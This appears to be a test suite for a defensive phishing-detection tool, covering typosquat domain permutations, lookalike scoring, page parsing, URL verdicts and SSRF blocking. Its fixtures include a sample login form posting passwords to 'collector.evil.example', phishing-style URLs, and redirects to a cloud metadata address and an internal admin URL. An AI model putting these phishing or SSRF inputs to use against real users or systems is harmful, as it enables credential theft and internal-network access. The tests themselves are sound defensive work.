import asyncio
from datetime import timedelta

from threatwatch.models import utcnow
from threatwatch.core.domains import is_valid_hostname
from threatwatch.models import Asset
from threatwatch.modules.phishing import page
from threatwatch.modules.phishing.analyzer import analyze
from threatwatch.modules.phishing.permutations import damerau_levenshtein, generate, skeleton
from threatwatch.modules.phishing.service import score_lookalike


def test_permutations_cover_classic_techniques():
    cands = {c.domain: c.technique for c in generate("paypal.com")}
    assert "paypal.com" not in cands
    assert cands["paypa1.com"] == "homoglyph"
    assert cands["papyal.com"] == "transposition"
    assert cands["paypl.com"] == "omission"
    assert cands["paypal.net"] == "tld-swap"
    assert cands["paypal-login.com"] == "combosquatting"
    assert any(d.startswith("xn--") for d, t in cands.items() if t == "idn-homograph")
    assert all(is_valid_hostname(d) for d in cands)


def test_permutation_limit_keeps_most_dangerous_first():
    cands = generate("example.com", limit=50)
    assert len(cands) == 50 and cands[0].technique == "idn-homograph"


def test_similarity_helpers():
    assert skeleton("paypa1") == skeleton("paypal")
    assert skeleton("rnicrosoft") == skeleton("microsoft")
    assert damerau_levenshtein("paypal", "papyal") == 1


def test_lookalike_scoring_orders_weaponised_above_parked():
    now = utcnow()
    weaponised, sev, _ = score_lookalike(technique="homoglyph", has_a=True, has_mx=True, page_live=True, parked=False,
                                         similarity=0.8, login_form=True, brand_mentioned=True,
                                         created=now - timedelta(days=3), in_feed=False)
    parked, *_ = score_lookalike(technique="omission", has_a=True, has_mx=False, page_live=True, parked=True,
                                 similarity=0.0, login_form=False, brand_mentioned=False,
                                 created=now - timedelta(days=3000), in_feed=False)
    assert sev == "critical" and weaponised > 90 and parked < 40


def test_page_parse_signals():
    html = ('<html><title>Acme | Sign in</title><body><form action="https://collector.evil.example/p.php">'
            '<input type="password"></form><img src="https://www.acme.example/logo.png"></body></html>')
    p = page.parse("https://acme-login.example/", "https://acme-login.example/", 200, html)
    assert p.has_password and p.form_action_hosts == ["collector.evil.example"]
    assert p.title == "Acme | Sign in"
    orig = page.parse("https://acme.example/", "https://acme.example/", 200, "<title>Acme | Sign in</title>")
    assert page.similarity(p, orig, "acme.example") > 0.7
    assert page.parse("x", "x", 200, "This domain is for sale! Buy this domain").parked


def test_url_analyzer_static(db):
    db.add(Asset(type="domain", value="acmebank.example", criticality="high"))
    db.commit()

    def run(url):
        return asyncio.run(analyze(url, db, fetch=False))

    bad = run("http://acmebank-secure-login.verify-account.top/webscr/login.php")
    assert bad["verdict"] in ("suspicious", "malicious")
    assert any("Brand" in s["signal"] for s in bad["signals"])
    good = run("https://www.acmebank.example/login")
    assert good["verdict"] == "low-risk"
    ip = run("http://45.9.148.3/office365/login")
    assert any("IP address" in s["signal"] for s in ip["signals"])


def test_fetch_blocks_ssrf_including_redirect_hops():
    import httpx

    def handler(req):
        if req.url.host == "93.184.215.14":
            return httpx.Response(302, headers={"location": "http://169.254.169.254/latest/meta-data/"})
        return httpx.Response(200, text="<title>internal secret</title>")

    async def go():
        async with httpx.AsyncClient(transport=httpx.MockTransport(handler)) as c:
            return await page.fetch(c, "http://93.184.215.14/"), await page.fetch(c, "http://10.0.0.5/admin")

    redirected, direct = asyncio.run(go())
    assert redirected.error and "not a public address" in redirected.error and not redirected.title
    assert direct.error and direct.status is None
